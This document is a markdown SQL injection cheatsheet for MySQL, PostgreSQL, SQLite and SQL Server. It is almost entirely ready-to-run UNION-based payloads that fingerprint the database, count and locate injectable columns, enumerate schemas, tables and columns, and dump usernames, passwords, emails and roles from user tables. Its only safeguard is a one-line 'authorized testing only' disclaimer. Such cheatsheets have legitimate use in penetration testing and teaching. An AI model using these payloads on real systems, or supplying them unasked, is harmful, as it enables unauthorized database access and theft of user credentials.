# Complete SQL Injection Cheatsheet

> **For educational and authorized security testing only**

**Supported databases:** MySQL / MariaDB, PostgreSQL, SQLite, SQL Server

---

## Database Detection



```sql
-- Test all database types
' UNION SELECT 1,2,3,4,5,6,
    CASE
        WHEN sqlite_version() IS NOT NULL THEN 'SQLite: ' || sqlite_version()
        WHEN @@version IS NOT NULL THEN 'MySQL: ' || SUBSTRING(@@version,1,50)
        WHEN version() IS NOT NULL THEN 'PostgreSQL: ' || SUBSTRING(version(),1,50)
        WHEN @@microsoftversion IS NOT NULL THEN 'MSSQL: ' || CAST(@@microsoftversion AS varchar)
        ELSE 'Unknown'
    END
;-- -
```

## Step 1: Find Total Number of Columns

```sql
' ORDER BY 1-- -   -- Check if 1 column works
' ORDER BY 2-- -   -- Check if 2 columns work
' ORDER BY 3-- -   -- Check if 3 columns work
' ORDER BY 4-- -   -- Check if 4 columns work
' ORDER BY 5-- -   -- Check if 5 columns work
' ORDER BY 6-- -   -- Check if 6 columns work
' ORDER BY 7-- -   -- Check if 7 columns work
' ORDER BY 8-- -   -- Should FAIL → means 7 columns is the maximum

Step 2: Find Visible Columns
sql
Copy code
' UNION SELECT 1,2,3,4,5,6,7-- -
-- Observe which numbers are reflected in the response
-- Those positions are injectable / visible
```

---


## Quick Checks

```sql
-- SQLite
' UNION SELECT 1,2,3,4,5,6,sqlite_version();-- -

-- MySQL / MariaDB
' UNION SELECT 1,2,3,4,5,6,@@version;-- -

-- PostgreSQL
' UNION SELECT 1,2,3,4,5,6,version();-- -

-- SQL Server
' UNION SELECT 1,2,3,4,5,6,@@microsoftversion;-- -
```

---

## Database Enumeration

### MySQL / MariaDB

```sql
-- List databases
' UNION SELECT 1,2,3,4,5,6,schema_name FROM information_schema.schemata;-- -

-- Current database
' UNION SELECT 1,2,3,4,5,6,DATABASE();-- -
```

### PostgreSQL

```sql
-- List databases
' UNION SELECT 1,2,3,4,5,6,datname FROM pg_database;-- -

-- Current database
' UNION SELECT 1,2,3,4,5,6,current_database();-- -
```

### SQL Server

```sql
-- List databases
' UNION SELECT 1,2,3,4,5,6,name FROM master..sysdatabases;-- -

-- Current database
' UNION SELECT 1,2,3,4,5,6,DB_NAME();-- -
```

### SQLite

```sql
-- Main database only
' UNION SELECT 1,2,3,4,5,6,'main';-- -
```

---

## Table Enumeration

### MySQL / MariaDB

```sql
' UNION SELECT 1,2,3,4,5,6,table_name
FROM information_schema.tables
WHERE table_schema = DATABASE();-- -
```

### PostgreSQL

```sql
' UNION SELECT 1,2,3,4,5,6,tablename
FROM pg_tables
WHERE schemaname = 'public';-- -
```

### SQL Server

```sql
' UNION SELECT 1,2,3,4,5,6,name
FROM sysobjects
WHERE xtype = 'U';-- -
```

### SQLite

```sql

' UNION SELECT 1,2,3,4,5,6,name FROM pragma_table_info('databasename');-- -



' UNION SELECT 1,2,3,4,5,6,(SELECT GROUP_CONCAT(name) FROM pragma_table_info('databasename'));-- -
```

---

## Column Enumeration

### MySQL / MariaDB

```sql
' UNION SELECT 1,2,3,4,5,6,column_name
FROM information_schema.columns
WHERE table_name = 'users'
AND table_schema = DATABASE();-- -
```

### PostgreSQL

```sql
' UNION SELECT 1,2,3,4,5,6,column_name
FROM information_schema.columns
WHERE table_name = 'users'
AND table_schema = 'public';-- -
```

### SQL Server

```sql
' UNION SELECT 1,2,3,4,5,6,name
FROM syscolumns
WHERE id = OBJECT_ID('users');-- -
```

### SQLite

```sql
' UNION SELECT 1,2,3,4,5,6,name
FROM pragma_table_info('Users');-- -
```

---

## Data Extraction

```sql
-- Username and password
' UNION SELECT 1,2,3,4,5,6,username || ':' || password
FROM users;-- -
```

### MySQL Example

```sql
' UNION SELECT 1,2,3,4,5,6,
CONCAT(id,'|',username,'|',password,'|',email)
FROM users;-- -
```

### SQLite Example

```sql
' UNION SELECT 1,2,3,4,5,6,
(SELECT GROUP_CONCAT(
    id || '|' || username || '|' || email || '|' || password || '|' || role,
    CHAR(10)
) FROM Users);
-- -
```

---

## Notes

* Adjust column count `(1,2,3,4,5,6)` to match the target query
* Use `-- -` or `#` for comments depending on database
* URL encode `'` as `%27` when required
* Use `LIMIT` / `OFFSET` for large tables
